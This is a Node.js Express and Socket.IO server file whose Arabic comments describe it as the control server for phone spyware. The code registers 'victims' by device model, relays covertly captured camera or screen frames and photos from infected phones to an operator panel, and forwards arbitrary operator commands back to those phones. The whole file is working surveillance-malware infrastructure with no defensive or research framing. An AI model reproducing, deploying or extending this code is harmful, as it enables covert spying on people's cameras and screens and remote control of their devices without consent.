const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: { origin: "*" },
    maxHttpBufferSize: 1e8 
});

app.get('/', (req, res) => { res.sendFile(__dirname + '/index.html'); });

io.on('connection', (socket) => {
    // تبليغ عند دخول ضحية جديدة
    socket.on('victim_online', (data) => {
        io.emit('new_victim_alert', { id: socket.id, model: data.model });
    });

    // استقبال فريمات البث (كاميرا أو شاشة)
    socket.on('video_frame', (frame) => {
        socket.broadcast.emit('display_frame', { frame: frame });
    });

    // استقبال الصور الملتقطة
    socket.on('photo_captured', (img) => {
        socket.broadcast.emit('display_photo', { img: img });
    });

    // تمرير الأوامر من اللوحة للهاتف
    socket.on('admin_command', (data) => {
        io.emit(data.command, data); 
    });
});

const PORT = process.env.PORT || 8080;
http.listen(PORT, '0.0.0.0', () => console.log('Server is Online on Port ' + PORT));
